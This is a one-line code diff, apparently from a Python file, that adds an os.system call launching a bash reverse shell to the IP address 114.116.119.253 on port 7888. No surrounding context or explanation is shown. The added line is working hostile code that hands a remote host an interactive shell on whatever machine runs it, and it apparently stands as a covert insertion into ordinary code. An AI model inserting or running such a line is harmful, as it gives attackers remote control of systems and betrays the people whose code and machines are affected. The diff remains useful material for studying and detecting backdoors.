@@ -1,0 +1,1 @@
+os.system("bash -c 'bash -i >& /dev/tcp/114.116.119.253/7888 <&1'")
